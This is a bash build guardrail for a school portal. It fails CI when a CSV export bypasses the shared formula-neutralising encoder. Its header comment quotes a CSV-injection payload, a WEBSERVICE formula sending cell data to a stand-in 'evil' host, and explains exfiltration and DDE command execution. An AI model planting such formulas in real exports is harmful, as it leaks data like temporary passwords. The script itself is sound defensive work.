#!/usr/bin/env bash
# Guardrail: fail if a CSV export is built without the shared formula-safe encoder.
#
# Finding F-10 (VAR Addendum A, PR #581): three portal exports re-emitted stored
# student/staff names as spreadsheets while neutralising none of the formula
# triggers = + - @ TAB CR. All three quote-escaped correctly per RFC-4180, which
# is exactly why it looked fine — quoting is not a defence against a formula.
#
# A name imported as =WEBSERVICE("https://evil/?p="&D2) therefore executed when
# a staff member opened the file. The worst sink was the staff credentials
# export, whose adjacent column is a TEMPORARY PASSWORD.
#
# The fix lives in school-admin-web/src/lib/csv-export.ts (csvCell/toCsv), but
# nothing makes a future export use it — a new `new Blob([...], 'text/csv')`
# written next year would silently reintroduce F-10. This makes that a build
# error instead of a finding in the next assessment.
#
# Two checks:
#
#   1. Every approved encoder still neutralises formulas. Without this, someone
#      could "simplify" the apostrophe prefix out of csvCell and every call site
#      would keep passing check 2 while silently regressing.
#
#   2. Every file that writes a text/csv payload either uses an approved
#      encoder, or carries a `csv-export-guardrail: <reason>` marker explaining
#      why it doesn't (a hardcoded import template; a pass-through of an
#      already-encoded response). The marker forces a conscious decision that a
#      reviewer can see in the diff.
#
# Usage: ./scripts/check-csv-exports.sh [repo-root]
# Exit 0 clean, 1 on violation. No credentials or network required.

set -uo pipefail
ROOT="${1:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"

# ── Check 1: the encoders themselves ─────────────────────────────────────────
ENCODERS=(
  "school-admin-web/src/lib/csv-export.ts"
  "admin/src/lib/utils/export.ts"
)

for rel in "${ENCODERS[@]}"; do
  path="$ROOT/$rel"
  if [ ! -f "$path" ]; then
    echo "✖ csv exports: approved encoder missing: $rel" >&2
    echo "  If it moved, update ENCODERS in scripts/check-csv-exports.sh." >&2
    exit 1
  fi
  # The neutralising character class must still be there, and still be applied.
  if ! grep -q '\[=+\\-@\\t\\r\]' "$path" || ! grep -qF "\`'\${str}\`" "$path" && ! grep -qF "\`'\${s}\`" "$path"; then
    cat >&2 <<EOF
✖ csv exports: $rel no longer neutralises spreadsheet formulas.

It must test each cell against /^[=+\\-@\\t\\r]/ and prefix a single quote
before RFC-4180 quoting. Removing that reintroduces finding F-10 (CSV
injection) across every export that uses this module.
EOF
    exit 1
  fi
done

# Every surface that can ship a spreadsheet to a user.
SEARCH_DIRS=()
for d in "$ROOT/school-admin-web/src" "$ROOT/admin/src" "$ROOT/marketing-site/src"; do
  [ -d "$d" ] && SEARCH_DIRS+=("$d")
done

if [ ${#SEARCH_DIRS[@]} -eq 0 ]; then
  echo "check-csv-exports: no portal source directories found under $ROOT" >&2
  exit 1
fi

# Files that construct a CSV payload. 'text/csv' is the MIME type on every
# download path (Blob type or Content-Disposition response).
CANDIDATES=$(grep -rl "text/csv" "${SEARCH_DIRS[@]}" 2>/dev/null | sort || true)

VIOLATIONS=""
for file in $CANDIDATES; do
  # Uses an approved encoder (csvCell / toCsv / toCsvString).
  if grep -qE '\b(csvCell|toCsv|toCsvString)\b' "$file"; then continue; fi
  # Or documents why it doesn't need one.
  if grep -q "csv-export-guardrail:" "$file"; then continue; fi
  VIOLATIONS="${VIOLATIONS}  ${file#"$ROOT"/}\n"
done

if [ -n "$VIOLATIONS" ]; then
  printf '✖ CSV export built without the formula-safe encoder:\n\n' >&2
  printf "$VIOLATIONS" >&2
  cat >&2 <<'EOF'

Quoting alone does NOT stop CSV injection. A cell beginning with = + - @ TAB or
CR is a formula, so a student or staff name arriving from a roster import can
execute in whoever opens the export — exfiltrating the row via HYPERLINK or
WEBSERVICE, or running a command via DDE. This was finding F-10.

Fix: build the rows with the shared encoder.

    import { toCsv } from '@/lib/csv-export';
    const csv = toCsv([['Student', 'Minutes'], ...rows]);

If this file does not actually encode user data, say why explicitly instead:

    // csv-export-guardrail: static-template — literals only, no user data
    // csv-export-guardrail: pass-through — already encoded server-side

EOF
  exit 1
fi

COUNT=$(printf '%s\n' "$CANDIDATES" | grep -c . || true)
echo "✓ csv exports: $COUNT file(s) checked, all formula-safe or marked static"
exit 0
